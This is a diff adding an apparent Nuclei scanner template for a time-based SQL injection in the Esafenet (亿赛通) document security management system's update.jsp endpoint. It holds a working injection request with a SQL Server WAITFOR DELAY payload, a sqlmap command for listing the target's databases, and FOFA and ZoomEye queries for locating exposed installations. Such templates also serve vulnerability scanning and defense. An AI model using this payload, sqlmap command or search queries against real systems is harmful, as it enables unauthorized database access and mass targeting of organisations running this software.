@@ -1,0 +1,29 @@
+id: esafenet-update-sqli
+
+info:
+  name: 亿赛通文档安全管理系统 update.jsp sql注入
+  author: SleepingBag945
+  severity: high
+  description: |-
+    亿赛通电子文档安全管理系统以数据资产防泄密为核心，涵盖文档安全、终端安全、防勒索、安全态势、集团管控五大板块，实现对用户电脑终端、移动办公、各类应用系统上的数据从生产、存储、流程、外发到销毁进行全生命周期保护。亿赛通电子文档安全管理系统update.jsp存在延迟注入。
+    python3 sqlmap.py -u "https://xxxxx/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)" --batch --dbs
+    FOFA: title="电子文档安全管理系统" && product="亿赛通-电子文档安全管理系统"
+    ZoomEye: app:"亿赛通电子文档安全管理系统"
+  reference:
+    - https://mp.weixin.qq.com/s/ClWs4d3l_2ZsNvCJFiY9gg
+  tags: esafenet
+
+http:
+  - raw:
+      - |              
+        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);{{sqlserver}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      sqlserver:
+        - "WAITFOR%20DELAY%20%270:0:1%27--"
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && duration>=3 && duration<=8 && contains(body,'激活') && contains(header,'html')" 
